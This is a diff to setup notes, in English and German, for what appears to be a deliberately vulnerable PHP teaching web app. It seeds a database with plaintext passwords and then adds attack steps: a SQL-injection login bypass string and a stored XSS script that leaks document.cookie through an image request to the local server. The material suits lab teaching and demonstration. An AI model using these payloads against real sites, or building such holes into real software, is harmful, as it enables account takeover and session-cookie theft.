@@ -19,13 +19,21 @@ php init_db.php
 	USE events;
 
 	//Create DB
-	CREATE TABLE users (id INT NOT NULL PRIMARY KEY AUTO_INCREMENT, name VARCHAR(20), passwd VARCHAR(30));
+	CREATE TABLE users (id INT NOT NULL PRIMARY KEY AUTO_INCREMENT, name VARCHAR(20), passwd VARCHAR(30), cookie INT);
+	CREATE TABLE posts (id INT NOT NULL PRIMARY KEY AUTO_INCREMENT, name VARCHAR(20), msg TEXT);
 
-	//Add admin
+	//Add users
 	INSERT INTO `users` (`id`,`name`,`passwd`) VALUES (NULL, "admin", "admin123");
+	INSERT INTO `users` (`id`,`name`,`passwd`) VALUES (NULL, "user_1", "123");
+	INSERT INTO `users` (`id`,`name`,`passwd`) VALUES (NULL, "user_2", "123");
+
+	//Add posts
+	INSERT INTO `posts` (`id`,`name`,`msg`) VALUES (NULL, "user_1", "Hello, how are you");
+	INSERT INTO `posts` (`id`,`name`,`msg`) VALUES (NULL, "user_2", "Hello, i'm sick and tired.");
+	INSERT INTO `posts` (`id`,`name`,`msg`) VALUES (NULL, "user_1", "Maybe a little cat can help you?<img src='./img/cat.jpg' alt='cat'>");
 
 	//To check DB
-	SELECT * FROM potluck;
+	SELECT * FROM users;
 
 5. // Start WebServer in ./webapp/
 php -S localhost:8000 
@@ -35,7 +43,21 @@ php -S localhost:8000
 
 //SQL INJECTION:
 TYPE
-random' OR 0=0 -- 
+' OR 0=0 -- 
 !!with space on the end!!
 in name field and nothing in passwd 
 
+//XSS Attack
+- Login als admin (From SQL-Inj teil)
+- Send new message:
+
+      Please no Offtop in this thread. 
+      <script>
+        img = new Image();
+        img.src = "http://localhost:8000/cat.jpg?"+document.cookie;
+      </script>
+
+- Log out
+- Log in als user_1:123  (Als ob ein reelen User eingeloggt haette)
+- Log out
+- Schau mal in Console mit laufende php server ob coockies empfangen wurden. (Schau presentation)
